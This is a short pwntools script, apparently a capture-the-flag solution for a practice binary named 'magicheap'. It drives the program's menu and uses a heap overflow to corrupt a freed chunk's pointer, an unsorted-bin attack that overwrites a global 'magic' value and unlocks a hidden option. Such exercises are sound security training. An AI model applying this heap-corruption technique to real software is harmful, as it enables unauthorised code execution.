from pwn import *

target = process('./magicheap')
# gdb.attach(target)

def add(size, content):
    target.recvuntil('choice :')
    target.sendline('1')
    target.recvuntil('Heap :')
    target.sendline(str(size))
    target.recvuntil('of heap:')
    target.send(content)

def edit(index, size, content):
    target.recvuntil('choice :')
    target.sendline('2')
    target.recvuntil('Index :')
    target.sendline(str(index))
    target.recvuntil('of Heap :')
    target.sendline(str(size))
    target.recvuntil('of heap :')
    target.sendline(content)

def delete(index):
    target.recvuntil('choice :')
    target.sendline('3')
    target.recvuntil('Index :')
    target.sendline(str(index))

magic = 0x6020c0
add(0xf0, "15935728")
add(0xf0, "75395128")
add(0x30, "05935728")
delete(1)
edit(0, 0x110, b"0"*0xf8 + p64(0x101) + b"1"*0x8 + p64(magic - 0x10))
add(0xf0, "0000")
target.sendline("4869")
target.interactive()

